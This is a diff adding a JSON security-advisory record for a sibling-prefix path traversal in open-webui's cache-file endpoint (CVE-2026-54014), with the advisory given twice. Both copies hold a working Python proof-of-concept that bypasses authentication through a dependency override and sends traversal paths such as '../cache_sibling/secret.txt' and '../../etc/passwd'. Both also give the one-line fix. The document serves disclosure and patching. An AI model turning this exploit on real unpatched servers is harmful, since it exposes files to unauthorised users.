@@ -1,0 +1,101 @@
+{
+  "global": {
+    "cve_id": "CVE-2026-54014",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 4.3,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N"
+      },
+      "cvss_v4": {
+        "score": 0,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-22"
+    ],
+    "description": "## Summary\n\nA path traversal vulnerability exists in open-webui's cache file serving endpoint that allows any authenticated user to read files from sibling directories outside the intended cache directory, by exploiting an incomplete `startswith` containment check that lacks a trailing path separator.\n\nThe root cause is that `serve_cache_file()` in `open_webui/main.py` validates the resolved path with `file_path.startswith(os.path.abspath(CACHE_DIR))` - without appending `os.sep`. This allows any path resolving to a sibling directory whose name begins with `cache` (e.g. `cache_sibling`, `cache_backup`, `cached_models`) to pass validation.\n\nDeep traversal and absolute paths are correctly blocked. The bypass is narrow but confirmed - limited to sibling-prefix directories.\n\n### Exploitation constraints\n\n| Constraint | Detail |\n|---|---|\n| Auth required | `get_verified_user` - any user with role `user` or `admin` |\n| Scope | Only sibling directories starting with `cache` (e.g. `cache_backup`, `cached_models`) |\n| Deep traversal | Blocked - `../../etc/passwd` correctly fails the startswith check |\n| Absolute paths | Blocked - `/etc/passwd` correctly fails |\n| Client normalization | httpx/browsers normalize `..` client-side - must use raw HTTP or ASGI to deliver payload |\n\n## Vulnerability Details\n\n### Vulnerable function: `serve_cache_file()`\n\n```python\n# open_webui/main.py, line 2907-2924\n@app.get('/cache/{path:path}')\nasync def serve_cache_file(path: str, user=Depends(get_verified_user)):\n    file_path = os.path.abspath(os.path.join(CACHE_DIR, path))\n    # prevent path traversal\n    if not file_path.startswith(os.path.abspath(CACHE_DIR)):   # ← BUG: no trailing os.sep\n        raise HTTPException(status_code=404, detail='File not found')\n    if not os.path.isfile(file_path):\n        raise HTTPException(status_code=404, detail='File not found')\n    return FileResponse(file_path, headers=headers)\n```\n\n### The bypass\n\n```python\nCACHE_DIR = \"/data/cache\"\n\n# Attacker path: \"../cache_sibling/secret.txt\"\nfile_path = os.path.abspath(os.path.join(\"/data/cache\", \"../cache_sibling/secret.txt\"))\n# → \"/data/cache_sibling/secret.txt\"\n\n\"/data/cache_sibling/secret.txt\".startswith(\"/data/cache\")\n# → True  ← BYPASS (because \"cache_sibling\" starts with \"cache\")\n\n# Correct check would be:\n\"/data/cache_sibling/secret.txt\".startswith(\"/data/cache/\")\n# → False  ← BLOCKED\n```\n\n## Proof of Concept\n\n### Environment\n\n| Component | Detail |\n|-----------|--------|\n| open-webui | 0.9.5 (pip installed) |\n| Python | 3.11 |\n| Import | `from open_webui.main import app` (true import, real FastAPI app) |\n| Method | Raw ASGI request (bypasses httpx client-side `..` normalization) |\n\n### poc.py\n\n```python\n\nimport asyncio\nimport os\nimport shutil\nimport sys\nimport tempfile\nTEMP_DATA = tempfile.mkdtemp(prefix=\"owui_poc_\")\nos.environ[\"DATA_DIR\"] = TEMP_DATA\nos.environ[\"WEBUI_SECRET_KEY\"] = \"poc_secret_key_12345\"\nos.environ[\"WEBUI_AUTH\"] = \"false\"\nCACHE_DIR = os.path.join(TEMP_DATA, \"cache\")\nSIBLING_DIR = os.path.join(TEMP_DATA, \"cache_sibling\")\nos.makedirs(CACHE_DIR, exist_ok=True)\nos.makedirs(SIBLING_DIR, exist_ok=True)\n\nSECRET_CONTENT = \"STOLEN_FROM_SIBLING_DIR\"\nwith open(os.path.join(SIBLING_DIR, \"secret.txt\"), \"w\") as f:\n    f.write(SECRET_CONTENT)\nwith open(os.path.join(CACHE_DIR, \"legit.txt\"), \"w\") as f:\n    f.write(\"legitimate_cache_file\")\nfrom open_webui.main import app\nfrom open_webui.utils.auth import get_verified_user\nclass FakeUser:\n    id = \"poc\"\n    email = \"poc@test\"\n    role = \"user\"\n\napp.dependency_overrides[get_verified_user] = lambda: FakeUser()\nasync def raw_asgi_get(app, path):\n    \"\"\"Send a raw ASGI request without client-side path normalization.\"\"\"\n    scope = {\n        \"type\": \"http\",\n        \"method\": \"GET\",\n        \"path\": path,\n        \"query_string\": b\"\",\n        \"headers\": [(b\"host\", b\"localhost\")],\n        \"root_path\": \"\",\n        \"asgi\": {\"version\": \"3.0\"},\n    }\n    response_started = False\n    status_code = None\n    body_parts = []\n\n    async def receive():\n        return {\"type\": \"http.request\", \"body\": b\"\"}\n\n    async def send(message):\n        nonlocal response_started, status_code\n        if message[\"type\"] == \"http.response.start\":\n            response_started = True\n            status_code = message[\"status\"]\n        elif message[\"type\"] == \"http.response.body\":\n            body_parts.append(message.get(\"body\", b\"\"))\n\n    await app(scope, receive, send)\n    return status_code, b\"\".join(body_parts)\n\n\nasync def main():\n    s1, b1 = await raw_asgi_get(app, \"/cache/legit.txt\")\n    s2, b2 = await raw_asgi_get(app, \"/cache/../cache_sibling/secret.txt\")\n    s3, b3 = await raw_asgi_get(app, \"/cache/../../etc/passwd\")\n\n    baseline_ok = s1 == 200 and b\"legitimate_cache_file\" in b1\n    exploit_ok = s2 == 200 and SECRET_CONTENT.encode() in b2\n    deep_blocked = s3 == 404\n\n    print(f\"package:     open_webui (pip installed)\")\n    print(f\"version:     0.9.5\")\n    print(f\"function:    serve_cache_file (GET /cache/{{path}})\")\n    print(f\"sink:        main.py:2914  file_path.startswith(os.path.abspath(CACHE_DIR))\")\n    print(f\"bypass:      startswith without trailing os.sep allows sibling-prefix match\")\n    print()\n    print(f\"CACHE_DIR:   {CACHE_DIR}\")\n    print(f\"SIBLING:     {SIBLING_DIR}\")\n    print()\n    print(f\"[baseline] /cache/legit.txt            status={s1} body={b1[:40]!r}\")\n    print(f\"[exploit]  /cache/../cache_sibling/secret.txt  status={s2} body={b2[:40]!r}\")\n    print(f\"[control]  /cache/../../etc/passwd     status={s3} (should be 404)\")\n    print()\n    print(f\"result:      {'VULNERABLE' if exploit_ok and baseline_ok and deep_blocked else 'NOT CONFIRMED'}\")\n\n    shutil.rmtree(TEMP_DATA, ignore_errors=True)\n    sys.exit(0 if exploit_ok else 1)\n\n\nif __name__ == \"__main__\":\n    asyncio.run(main())\n\n```\n\n### PoC output \n\n<img width=\"1392\" height=\"288\" alt=\"image\" src=\"https://github.com/user-attachments/assets/2fbef163-9ef5-4ed5-aa53-a49bd9bf4713\" />\n\n\n## Suggested Fix\n\n```python\nif not file_path.startswith(os.path.abspath(CACHE_DIR) + os.sep):\n    raise HTTPException(status_code=404, detail='File not found')\n```\n\nSingle character fix: append `os.sep` to the prefix in the `startswith` check.",
+    "ghsa_id": "GHSA-j2c8-v969-8r5c",
+    "html_url": "https://github.com/advisories/GHSA-j2c8-v969-8r5c",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-j2c8-v969-8r5c"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-54014"
+      }
+    ],
+    "published_at": "2026-06-17T14:16:25Z",
+    "references": [
+      "https://github.com/open-webui/open-webui/security/advisories/GHSA-j2c8-v969-8r5c",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-54014",
+      "https://github.com/advisories/GHSA-j2c8-v969-8r5c",
+      "https://github.com/open-webui/open-webui",
+      "https://github.com/pypa/advisory-database/tree/main/vulns/open-webui/PYSEC-2026-2736.yaml",
+      "https://pypi.org/project/open-webui"
+    ],
+    "severity": "medium",
+    "summary": "Open WebUI: Sibling-Prefix Path Traversal via /cache/{path}",
+    "updated_at": "2026-07-20T21:05:21Z",
+    "vulnerabilities": [
+      {
+        "first_patched_version": "0.9.6",
+        "package": {
+          "ecosystem": "pip",
+          "name": "open-webui"
+        },
+        "vulnerable_version_range": "<= 0.9.5"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "id": "GHSA-j2c8-v969-8r5c",
+  "repo": {
+    "cve_id": "CVE-2026-54014",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 4.3,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-22"
+    ],
+    "description": "## Summary\r\n\r\nA path traversal vulnerability exists in open-webui's cache file serving endpoint that allows any authenticated user to read files from sibling directories outside the intended cache directory, by exploiting an incomplete `startswith` containment check that lacks a trailing path separator.\r\n\r\nThe root cause is that `serve_cache_file()` in `open_webui/main.py` validates the resolved path with `file_path.startswith(os.path.abspath(CACHE_DIR))` - without appending `os.sep`. This allows any path resolving to a sibling directory whose name begins with `cache` (e.g. `cache_sibling`, `cache_backup`, `cached_models`) to pass validation.\r\n\r\nDeep traversal and absolute paths are correctly blocked. The bypass is narrow but confirmed - limited to sibling-prefix directories.\r\n\r\n### Exploitation constraints\r\n\r\n| Constraint | Detail |\r\n|---|---|\r\n| Auth required | `get_verified_user` - any user with role `user` or `admin` |\r\n| Scope | Only sibling directories starting with `cache` (e.g. `cache_backup`, `cached_models`) |\r\n| Deep traversal | Blocked - `../../etc/passwd` correctly fails the startswith check |\r\n| Absolute paths | Blocked - `/etc/passwd` correctly fails |\r\n| Client normalization | httpx/browsers normalize `..` client-side - must use raw HTTP or ASGI to deliver payload |\r\n\r\n## Vulnerability Details\r\n\r\n### Vulnerable function: `serve_cache_file()`\r\n\r\n```python\r\n# open_webui/main.py, line 2907-2924\r\n@app.get('/cache/{path:path}')\r\nasync def serve_cache_file(path: str, user=Depends(get_verified_user)):\r\n    file_path = os.path.abspath(os.path.join(CACHE_DIR, path))\r\n    # prevent path traversal\r\n    if not file_path.startswith(os.path.abspath(CACHE_DIR)):   # ← BUG: no trailing os.sep\r\n        raise HTTPException(status_code=404, detail='File not found')\r\n    if not os.path.isfile(file_path):\r\n        raise HTTPException(status_code=404, detail='File not found')\r\n    return FileResponse(file_path, headers=headers)\r\n```\r\n\r\n### The bypass\r\n\r\n```python\r\nCACHE_DIR = \"/data/cache\"\r\n\r\n# Attacker path: \"../cache_sibling/secret.txt\"\r\nfile_path = os.path.abspath(os.path.join(\"/data/cache\", \"../cache_sibling/secret.txt\"))\r\n# → \"/data/cache_sibling/secret.txt\"\r\n\r\n\"/data/cache_sibling/secret.txt\".startswith(\"/data/cache\")\r\n# → True  ← BYPASS (because \"cache_sibling\" starts with \"cache\")\r\n\r\n# Correct check would be:\r\n\"/data/cache_sibling/secret.txt\".startswith(\"/data/cache/\")\r\n# → False  ← BLOCKED\r\n```\r\n\r\n## Proof of Concept\r\n\r\n### Environment\r\n\r\n| Component | Detail |\r\n|-----------|--------|\r\n| open-webui | 0.9.5 (pip installed) |\r\n| Python | 3.11 |\r\n| Import | `from open_webui.main import app` (true import, real FastAPI app) |\r\n| Method | Raw ASGI request (bypasses httpx client-side `..` normalization) |\r\n\r\n### poc.py\r\n\r\n```python\r\n\r\nimport asyncio\r\nimport os\r\nimport shutil\r\nimport sys\r\nimport tempfile\r\nTEMP_DATA = tempfile.mkdtemp(prefix=\"owui_poc_\")\r\nos.environ[\"DATA_DIR\"] = TEMP_DATA\r\nos.environ[\"WEBUI_SECRET_KEY\"] = \"poc_secret_key_12345\"\r\nos.environ[\"WEBUI_AUTH\"] = \"false\"\r\nCACHE_DIR = os.path.join(TEMP_DATA, \"cache\")\r\nSIBLING_DIR = os.path.join(TEMP_DATA, \"cache_sibling\")\r\nos.makedirs(CACHE_DIR, exist_ok=True)\r\nos.makedirs(SIBLING_DIR, exist_ok=True)\r\n\r\nSECRET_CONTENT = \"STOLEN_FROM_SIBLING_DIR\"\r\nwith open(os.path.join(SIBLING_DIR, \"secret.txt\"), \"w\") as f:\r\n    f.write(SECRET_CONTENT)\r\nwith open(os.path.join(CACHE_DIR, \"legit.txt\"), \"w\") as f:\r\n    f.write(\"legitimate_cache_file\")\r\nfrom open_webui.main import app\r\nfrom open_webui.utils.auth import get_verified_user\r\nclass FakeUser:\r\n    id = \"poc\"\r\n    email = \"poc@test\"\r\n    role = \"user\"\r\n\r\napp.dependency_overrides[get_verified_user] = lambda: FakeUser()\r\nasync def raw_asgi_get(app, path):\r\n    \"\"\"Send a raw ASGI request without client-side path normalization.\"\"\"\r\n    scope = {\r\n        \"type\": \"http\",\r\n        \"method\": \"GET\",\r\n        \"path\": path,\r\n        \"query_string\": b\"\",\r\n        \"headers\": [(b\"host\", b\"localhost\")],\r\n        \"root_path\": \"\",\r\n        \"asgi\": {\"version\": \"3.0\"},\r\n    }\r\n    response_started = False\r\n    status_code = None\r\n    body_parts = []\r\n\r\n    async def receive():\r\n        return {\"type\": \"http.request\", \"body\": b\"\"}\r\n\r\n    async def send(message):\r\n        nonlocal response_started, status_code\r\n        if message[\"type\"] == \"http.response.start\":\r\n            response_started = True\r\n            status_code = message[\"status\"]\r\n        elif message[\"type\"] == \"http.response.body\":\r\n            body_parts.append(message.get(\"body\", b\"\"))\r\n\r\n    await app(scope, receive, send)\r\n    return status_code, b\"\".join(body_parts)\r\n\r\n\r\nasync def main():\r\n    s1, b1 = await raw_asgi_get(app, \"/cache/legit.txt\")\r\n    s2, b2 = await raw_asgi_get(app, \"/cache/../cache_sibling/secret.txt\")\r\n    s3, b3 = await raw_asgi_get(app, \"/cache/../../etc/passwd\")\r\n\r\n    baseline_ok = s1 == 200 and b\"legitimate_cache_file\" in b1\r\n    exploit_ok = s2 == 200 and SECRET_CONTENT.encode() in b2\r\n    deep_blocked = s3 == 404\r\n\r\n    print(f\"package:     open_webui (pip installed)\")\r\n    print(f\"version:     0.9.5\")\r\n    print(f\"function:    serve_cache_file (GET /cache/{{path}})\")\r\n    print(f\"sink:        main.py:2914  file_path.startswith(os.path.abspath(CACHE_DIR))\")\r\n    print(f\"bypass:      startswith without trailing os.sep allows sibling-prefix match\")\r\n    print()\r\n    print(f\"CACHE_DIR:   {CACHE_DIR}\")\r\n    print(f\"SIBLING:     {SIBLING_DIR}\")\r\n    print()\r\n    print(f\"[baseline] /cache/legit.txt            status={s1} body={b1[:40]!r}\")\r\n    print(f\"[exploit]  /cache/../cache_sibling/secret.txt  status={s2} body={b2[:40]!r}\")\r\n    print(f\"[control]  /cache/../../etc/passwd     status={s3} (should be 404)\")\r\n    print()\r\n    print(f\"result:      {'VULNERABLE' if exploit_ok and baseline_ok and deep_blocked else 'NOT CONFIRMED'}\")\r\n\r\n    shutil.rmtree(TEMP_DATA, ignore_errors=True)\r\n    sys.exit(0 if exploit_ok else 1)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    asyncio.run(main())\r\n\r\n```\r\n\r\n### PoC output \r\n\r\n<img width=\"1392\" height=\"288\" alt=\"image\" src=\"https://github.com/user-attachments/assets/2fbef163-9ef5-4ed5-aa53-a49bd9bf4713\" />\r\n\r\n\r\n## Suggested Fix\r\n\r\n```python\r\nif not file_path.startswith(os.path.abspath(CACHE_DIR) + os.sep):\r\n    raise HTTPException(status_code=404, detail='File not found')\r\n```\r\n\r\nSingle character fix: append `os.sep` to the prefix in the `startswith` check.",
+    "ghsa_id": "GHSA-j2c8-v969-8r5c",
+    "html_url": "https://github.com/open-webui/open-webui/security/advisories/GHSA-j2c8-v969-8r5c",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-j2c8-v969-8r5c"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-54014"
+      }
+    ],
+    "published_at": "2026-06-11T19:04:46Z",
+    "references": [],
+    "severity": "medium",
+    "summary": "Sibling-Prefix Path Traversal via /cache/{path} in open-webui/open-webui",
+    "updated_at": "2026-06-11T19:04:47Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "pip",
+          "name": "open-webui"
+        },
+        "patched_versions": ">= 0.9.6",
+        "vulnerable_version_range": "<=0.9.5"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "open-webui/open-webui"
+}
